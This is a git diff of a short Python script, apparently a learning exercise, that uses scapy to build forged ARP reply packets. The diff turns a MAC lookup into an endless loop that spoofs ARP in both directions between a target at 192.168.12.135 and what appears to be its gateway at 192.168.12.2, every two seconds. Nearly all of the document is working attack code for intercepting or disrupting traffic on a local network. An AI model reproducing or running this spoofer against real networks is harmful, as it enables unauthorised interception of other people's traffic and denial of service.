@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 import scapy.all as scapy
+import time
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -14,5 +15,7 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
     scapy.send(packet)
 
-mac = get_mac("192.168.12.135");
-print(mac)
+while True:
+    spoof("192.168.12.135", "192.168.12.2")
+    spoof("192.168.12.2", "192.168.12.135")
+    time.sleep(2)
